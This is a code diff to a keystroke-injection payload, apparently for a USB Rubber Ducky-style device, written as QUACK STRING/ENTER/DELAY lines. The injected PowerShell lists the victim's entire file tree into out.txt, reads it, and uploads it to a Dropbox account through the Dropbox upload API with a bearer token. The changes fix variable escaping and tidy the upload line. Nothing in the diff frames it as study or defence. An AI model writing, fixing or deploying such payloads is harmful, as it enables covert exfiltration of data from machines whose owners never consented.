@@ -27,35 +27,26 @@ QUACK DELAY 1000
 QUACK STRING tree /f /a > out.txt
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $filePath='./out.txt';
+QUACK STRING \$filePath='./out.txt';
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $accessToken='$DROPBOX_ACCESS_TOKEN'
+QUACK STRING \$fileContent = [System.IO.File]::ReadAllBytes(\$filePath)
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $authHeader=@{Authorization = 'Bearer $accessToken'}
+QUACK STRING \$dropboxFilePath='/out_exported.txt'
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $dropboxFilePath='/out_exported.txt'
+QUACK STRING \$headers = @{}
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $uploadUrl='https://content.dropboxapi.com/2/files/upload'
+QUACK STRING \$headers.Add('Authorization', 'Bearer $DROPBOX_ACCESS_TOKEN')
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $headers = @{}
+QUACK STRING \$headers.Add('Dropbox-API-Arg', '{\"path\":\"' + \$dropboxFilePath + '\",\"mode\":\"add\",\"autorename\":true,\"mute\":false}')
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $headers.Add('Authorization', 'Bearer $accessToken')
+QUACK STRING \$headers.Add('Content-Type', 'application/octet-stream')
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $headers.Add('Dropbox-API-Arg', '{\"path\":\"' + $dropboxFilePath + '\",\"mode\":\"add\",\"autorename\":true,\"mute\":false}')
-QUACK ENTER
-QUACK DELAY 500
-QUACK STRING $headers.Add('Content-Type', 'application/octet-stream')
-QUACK ENTER
-QUACK DELAY 500
-QUACK STRING Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body 
-QUACK ENTER
-QUACK DELAY 500
-QUACK STRING $fileContent; exit;
+QUACK STRING Invoke-RestMethod -Uri 'https://content.dropboxapi.com/2/files/upload' -Headers \$headers -Method Post -Body \$fileContent; exit;
 QUACK ENTER
